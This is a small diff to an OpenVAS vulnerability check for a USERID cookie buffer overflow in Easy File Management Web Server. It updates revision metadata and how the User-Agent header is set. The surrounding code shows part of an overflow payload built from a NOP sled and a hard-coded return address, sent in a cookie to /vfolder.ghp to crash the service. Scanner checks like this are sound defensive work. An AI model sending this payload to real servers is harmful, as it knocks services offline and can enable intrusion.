@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_easy_file_management_web_server_bof_vuln.nasl 11424 2018-09-17 08:03:52Z mmartin $
+# $Id: gb_easy_file_management_web_server_bof_vuln.nasl 11492 2018-09-20 08:38:50Z mmartin $
 #
 # Easy File Management Web Server USERID Buffer Overflow Vulnerability
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805096");
-  script_version("$Revision: 11424 $");
+  script_version("$Revision: 11492 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-17 10:03:52 +0200 (Mon, 17 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 10:38:50 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-08-24 16:20:19 +0530 (Mon, 24 Aug 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Easy File Management Web Server USERID Buffer Overflow Vulnerability");
@@ -88,7 +88,7 @@ if(http_is_dead(port:http_port)){
 }
 
 host = http_host_name(port:http_port);
-
+useragent = get_http_user_agent();
 UserID= crap(length:80, data:raw_string(0x90)) +
         raw_string(0xc8, 0xd8, 0x01, 0x10) +  crap(length:280,
         data:raw_string(0x90)) +
@@ -106,7 +106,7 @@ UserID= crap(length:80, data:raw_string(0x90)) +
 
 sndReq = 'GET /vfolder.ghp HTTP/1.1\r\n' +
          'Host: ' +  host + '\r\n' +
-         'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+         'User-Agent: ' + useragent + '\r\n' +
          'Cookie: SESSIONID=1337; UserID=' +  UserID  +'PassWD=' + '\r\n' +
            '\r\n';
 
